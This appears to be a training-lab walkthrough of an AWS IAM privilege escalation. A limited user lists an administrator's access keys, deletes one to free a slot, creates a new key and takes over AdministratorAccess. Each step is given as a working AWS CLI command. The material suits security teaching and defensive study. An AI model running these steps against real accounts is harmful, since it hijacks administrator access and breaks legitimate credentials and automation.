# Guided Walkthrough: Privilege Escalation via iam:DeleteAccessKey + iam:CreateAccessKey

This scenario demonstrates a sophisticated variation of the `iam:CreateAccessKey` privilege escalation technique. AWS limits each IAM user to a maximum of two access keys. When a target admin user already has two active access keys, a simple `iam:CreateAccessKey` attack would fail. However, if an attacker has both `iam:DeleteAccessKey` and `iam:CreateAccessKey` permissions, they can bypass this limitation by first deleting one of the existing keys, then creating a new one under their control.

This attack is particularly dangerous because it works even when standard `iam:CreateAccessKey` exploitation would be blocked by AWS's built-in safety limits. Organizations that believe they're protected because their admin users maintain two active keys are vulnerable to this bypass technique. The attacker can identify which keys exist, delete one (potentially disrupting legitimate automation or access), and then create a new key they control.

This technique represents a common oversight in IAM security monitoring. While many organizations watch for `CreateAccessKey` API calls on privileged accounts, they may not correlate these events with preceding `DeleteAccessKey` calls. The combination of these two permissions creates a privilege escalation path that's more subtle and harder to detect than the standard access key creation attack, especially if the deleted key wasn't actively monitored.

## The Challenge

You start as `pl-prod-iam-003-to-admin-starting-user` — a limited IAM user whose credentials were provided via Terraform outputs. Your target is `pl-prod-iam-003-to-admin-target-user`, an IAM user with `AdministratorAccess`. There's a twist: the target user already has two active access keys, which is AWS's per-user maximum. A straight `iam:CreateAccessKey` call will be rejected.

Your starting user has been granted `iam:ListAccessKeys`, `iam:DeleteAccessKey`, and `iam:CreateAccessKey` permissions scoped to the target admin user. You need to use all three to reach admin.

## Reconnaissance

First, confirm who you are and verify you don't already have elevated access:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# Should return: arn:aws:iam::{account_id}:user/pl-prod-iam-003-to-admin-starting-user

aws iam list-users --max-items 1
# Should fail with AccessDenied — you don't have admin permissions yet
```

Now enumerate the target user's existing access keys. This tells you how many slots are occupied and gives you the key IDs you'll need for deletion:

```bash
aws iam list-access-keys --user-name pl-prod-iam-003-to-admin-target-user --output json
```

You'll see two entries in `AccessKeyMetadata`. Both slots are full — that's why a direct `CreateAccessKey` would fail with `LimitExceeded`.

## Exploitation

### Step 1: Delete an existing access key

Pick one of the two existing key IDs from the enumeration output and delete it to free up a slot:

```bash
aws iam delete-access-key \
  --user-name pl-prod-iam-003-to-admin-target-user \
  --access-key-id <ACCESS_KEY_ID_TO_DELETE>
```

This call succeeds because your starting user has `iam:DeleteAccessKey` on the target user. The deleted key is gone permanently — any automation relying on it will start failing immediately, which is a noisy side effect of this technique.

### Step 2: Create a new access key

With one slot now free, create a new access key for the admin user:

```bash
aws iam create-access-key --user-name pl-prod-iam-003-to-admin-target-user --output json
```

The response contains both `AccessKeyId` and `SecretAccessKey`. Save both values — the secret key is only shown once.

### Step 3: Switch to admin credentials

Export the new credentials and wait briefly for them to propagate:

```bash
export AWS_ACCESS_KEY_ID=<new_access_key_id>
export AWS_SECRET_ACCESS_KEY=<new_secret_access_key>
unset AWS_SESSION_TOKEN

# Wait ~15 seconds for IAM key propagation
sleep 15
```

## Verification

Confirm you're now operating as the admin user and have full administrative access:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# Returns: arn:aws:iam::{account_id}:user/pl-prod-iam-003-to-admin-target-user

aws iam list-users --max-items 3 --output table
# Succeeds — you now have AdministratorAccess
```

## What Happened

You started as a low-privilege IAM user and used three IAM permissions to take over an admin account: `iam:ListAccessKeys` to discover the key slots were full, `iam:DeleteAccessKey` to clear one slot, and `iam:CreateAccessKey` to inject a new key under your control. The admin user's `AdministratorAccess` policy then became yours to wield.

This pattern is more dangerous than the basic `iam:CreateAccessKey` escalation because it succeeds even against admin users who are "protected" by having both key slots occupied — a common but ineffective hardening measure. In real environments, deleting the existing key also breaks any legitimate automation using that key, potentially triggering incident response while the attacker already has admin access.
